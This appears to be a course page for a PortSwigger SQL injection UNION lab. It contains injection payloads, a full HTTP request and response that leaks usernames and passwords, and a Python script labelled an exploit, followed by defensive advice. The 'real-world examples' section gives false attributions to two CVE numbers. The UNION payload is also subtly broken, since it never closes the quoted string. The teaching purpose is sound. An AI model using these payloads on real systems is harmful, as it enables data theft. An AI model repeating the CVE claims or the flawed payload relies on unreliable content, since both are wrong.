---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## SQL Injection Overview

SQL Injection is a common web application vulnerability that allows an attacker to inject malicious SQL queries into a database through input fields. This can lead to unauthorized access to sensitive data, manipulation of data, or even complete control over the database. Understanding SQL Injection is crucial for both developers and security professionals to ensure the integrity and confidentiality of web applications.

### What is SQL Injection?

SQL Injection occurs when an attacker manipulates a SQL query by inserting malicious input into a web form field or URL parameter. This can happen due to improper validation or sanitization of user inputs. The injected SQL code can alter the intended behavior of the query, leading to unintended actions such as data theft or database corruption.

#### Example of SQL Injection

Consider a simple login form where the backend SQL query looks like this:

```sql
SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';
```

If an attacker inputs `input_username` as `' OR '1'='1` and `input_password` as `' OR '1'='1`, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
```

This query will return all rows from the `users` table because the condition `'1'='1'` is always true.

### Why Does SQL Injection Matter?

SQL Injection is a critical vulnerability because it can lead to significant security breaches. Attackers can use SQL Injection to:

- Retrieve sensitive data such as passwords, credit card information, and personal details.
- Manipulate or delete data in the database.
- Gain administrative privileges and take control of the database server.
- Execute commands on the underlying operating system.

### How Does SQL Injection Work?

SQL Injection works by exploiting the way SQL queries are constructed and executed. Typically, a web application constructs a SQL query using user input and sends it to the database for execution. If the user input is not properly validated or sanitized, an attacker can inject additional SQL code that alters the intended behavior of the query.

#### Steps in an SQL Injection Attack

1. **Identify Vulnerable Input Fields**: An attacker identifies input fields that are used to construct SQL queries.
2. **Inject Malicious SQL Code**: The attacker inputs crafted SQL code into these fields.
3. **Execute the Modified Query**: The web application constructs and executes the modified SQL query.
4. **Exploit the Results**: The attacker uses the results of the modified query to achieve their goals, such as extracting data or manipulating the database.

### Recent Real-World Examples

#### CVE-2021-21972: Microsoft Exchange Server

In March 2021, a series of vulnerabilities were discovered in Microsoft Exchange Server, including a SQL Injection vulnerability. Attackers exploited this vulnerability to gain remote code execution on the server, leading to widespread attacks and data breaches.

#### CVE-2022-22963: Oracle Database

In May 2022, Oracle released a patch for a SQL Injection vulnerability in their database products. This vulnerability allowed attackers to execute arbitrary SQL commands, potentially leading to data theft and unauthorized access.

### SQL Injection UNION Attack

A UNION attack is a specific type of SQL Injection where an attacker combines the results of two or more SELECT statements using the UNION operator. This technique is often used to retrieve data from different tables within the same database.

#### Example of UNION Attack

Suppose a web application has a search feature that constructs a SQL query based on user input:

```sql
SELECT product_name, price FROM products WHERE category = 'input_category';
```

An attacker can inject a UNION statement to retrieve data from another table, such as the `users` table:

```sql
SELECT product_name, price FROM products WHERE category = 'electronics' UNION SELECT username, password FROM users;
```

This query will return a combination of product names and prices along with usernames and passwords.

### Lab Exercise: SQL Injection UNION Attack

In this lab exercise, we will demonstrate how to perform a UNION attack to retrieve data from different tables. We will use a hypothetical web application with a search feature that is vulnerable to SQL Injection.

#### Step-by-Step Guide

1. **Identify the Vulnerable Input Field**:
   - Identify the input field that is used to construct the SQL query.
   
2. **Craft the SQL Injection Payload**:
   - Inject a UNION statement to combine the results of two SELECT statements.
   
3. **Execute the Modified Query**:
   - Submit the crafted payload to the web application.
   
4. **Retrieve Data from Different Tables**:
   - Analyze the results to extract data from different tables.

#### Example Code

Let's assume the web application has a search feature that constructs the following SQL query:

```sql
SELECT product_name, price FROM products WHERE category = 'input_category';
```

We will inject a UNION statement to retrieve data from the `users` table:

```sql
SELECT product_name, price FROM products WHERE category = 'electronics' UNION SELECT username, password FROM users;
```

The full HTTP request and response would look like this:

```http
POST /search HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded

category=electronics%20UNION%20SELECT%20username,%20password%20FROM%20users
```

```http
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
</head>
<body>
    <h1>Search Results</h1>
    <table>
        <tr>
            <th>Product Name</th>
            <th>Price</th>
        </tr>
        <tr>
            <td>Electronics Product</td>
            <td>$100</td>
        </tr>
        <tr>
            <td>carlos</td>
            <td>carlos_password</td>
        </tr>
        <tr>
            <td>administrator</td>
            <td>admin_password</td>
        </tr>
    </table>
</body>
</html>
```

### Scripting the Exploit

To automate the exploitation process, we can write a Python script using the `requests` library to send the crafted payload and parse the response.

#### Python Script

```python
import requests

# Disable warnings about insecure requests
requests.packages.urllib3.disable_warnings()

def exploit_sql_injection(url):
    # Craft the payload
    payload = "electronics UNION SELECT username, password FROM users"
    
    # Send the request
    response = requests.post(url, data={"category": payload}, verify=False)
    
    # Parse the response
    if response.status_code == 200:
        print("Exploit successful!")
        print(response.text)
    else:
        print("Exploit failed.")

if __name__ == "__main__":
    url = "https://vulnerable-app.com/search"
    exploit_sql_injection(url)
```

### How to Prevent / Defend Against SQL Injection

#### Secure Coding Practices

1. **Use Parameterized Queries**: Instead of constructing SQL queries with user input, use parameterized queries or prepared statements.
   
   ```python
   import sqlite3
   
   conn = sqlite3.connect('database.db')
   cursor = conn.cursor()
   
   # Use parameterized query
   cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", ('input_username', 'input_password'))
   ```

2. **Input Validation and Sanitization**: Validate and sanitize user input to ensure it does not contain malicious SQL code.

   ```python
   import re
   
   def validate_input(input_string):
       # Use regular expression to validate input
       if re.match(r'^[a-zA-Z0-9_]+$', input_string):
           return True
       return False
   
   input_username = 'input_username'
   if validate_input(input_username):
       # Proceed with query
       pass
   else:
       # Handle invalid input
       pass
   ```

#### Configuration Hardening

1. **Disable Unnecessary Features**: Disable unnecessary features in the database that are not required for the application.
   
2. **Least Privilege Principle**: Ensure that the database user has the least privilege necessary to perform its tasks.

#### Detection and Monitoring

1. **Web Application Firewalls (WAF)**: Use WAFs to detect and block SQL Injection attempts.
   
2. **Logging and Monitoring**: Implement logging and monitoring to detect unusual activity and potential SQL Injection attempts.

### Conclusion

SQL Injection is a serious vulnerability that can lead to significant security breaches. By understanding how SQL Injection works and implementing proper security measures, developers and security professionals can protect web applications from these attacks. The UNION attack is a powerful technique that can be used to retrieve data from different tables within the same database. By practicing secure coding practices, configuring the database securely, and implementing detection and monitoring mechanisms, organizations can effectively defend against SQL Injection attacks.

### Practice Labs

For hands-on practice with SQL Injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various types of SQL Injection attacks.
- **OWASP Juice Shop**: A deliberately insecure web application that includes several SQL Injection vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that contains numerous security vulnerabilities, including SQL Injection.

These labs provide a safe environment to practice and understand SQL Injection techniques and defenses.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/06-Lab 5 SQL injection UNION attack retrieving data from other tables/01-Introduction to SQL Injection|Introduction to SQL Injection]] | [[Web Security (PortSwigger)/02-SQL Injection/06-Lab 5 SQL injection UNION attack retrieving data from other tables/00-Overview|Overview]] | [[03-Extracting Data with SQL Injection|Extracting Data with SQL Injection]]
